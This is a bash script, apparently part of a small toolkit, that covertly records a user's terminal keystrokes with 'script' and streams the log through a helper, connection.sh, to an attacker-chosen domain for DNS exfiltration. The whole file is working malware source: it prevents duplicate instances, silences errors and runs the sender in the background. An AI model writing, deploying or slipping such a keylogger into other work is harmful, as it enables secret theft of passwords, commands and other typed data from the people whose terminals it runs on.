#!/bin/bash
# Log terminal keystrokes and send to dns exfiltrator
# Usage: logger.sh [-options] domain
# Positional Arguments:
#   domain: the domain to send data to
# Options:
#   -p path: give path to log file to listen to

# check if already running
is_running=`ps aux | grep -i "logger.sh" | grep -v "grep" | wc -l`
if [ $is_running -gt 2 ]; then
  echo "Already running"
  exit 1
fi

# globals/constants
log_file_path="/tmp/file-$(date +%s).log"
domain=""

# check command line options
while [ $# -gt 0 ]; do
  # check if server is on localhost
  if [ $1 = "-p" ]; then
    if ! [ -n "$2" ]; then
      # echo "You must specify a directory when using the -p option"
      exit 1
    fi
    if ! [ -d "$2" ]; then
      # echo "Directory does not exist"
      exit 1
    fi
    log_file_path="$2/file-$(date +%s).log"
    shift
  else
    # if it isn't an option, must be a positional argument
    domain="$1"
    break
  fi
  shift
done

if [ -z $domain ]; then
  echo "Must supply a domain!"
  exit 1
fi

touch "$log_file_path"

# start background script to check for changes in log file
tail -f "$log_file_path" | ./connection.sh "$domain" &> /dev/null &
bg_pid=$!

# start logger
script -f -q -I "$log_file_path" 2> /dev/null

# stop background script and delete log file
kill "$bg_pid" &> /dev/null
wait "$bg_pid" &> /dev/null
# rm "$log_file_path"
exit 0